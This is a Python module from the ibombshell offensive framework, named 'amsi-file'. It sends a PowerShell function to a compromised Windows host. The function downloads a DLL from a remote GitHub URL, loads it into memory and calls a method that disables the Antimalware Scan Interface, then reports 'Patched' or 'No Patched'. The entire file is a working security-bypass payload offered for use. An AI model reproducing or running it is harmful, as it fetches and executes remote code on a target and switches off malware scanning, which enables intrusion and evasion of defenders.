from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-file",
                       "Description": "amsi bypass with dll in disk",
                       "Author": "@pablogonzalezpe, @josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "dll": ["https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/files/amsi-surprise.dll", "dll url", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function amsi-dlldisk {
                  param(
                [Parameter(Mandatory)]
                [string] $dll
                )
                $output = $pwd
                try{    
                    Start-BitsTransfer -Source $dll -Destination $output
                    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($output.Path+"\\amsi-surprise.dll"))
                } catch {
                    
                }
                $res = [Bypass.AMSI]::Disable()
                if ($res -eq 0) {
                    return 'Patched'
                }else {
                    return 'No Patched'
                }
            }
            """

        function += 'amsi-dlldisk -dll ' + self.args["dll"]
        super(CustomModule, self).run(function)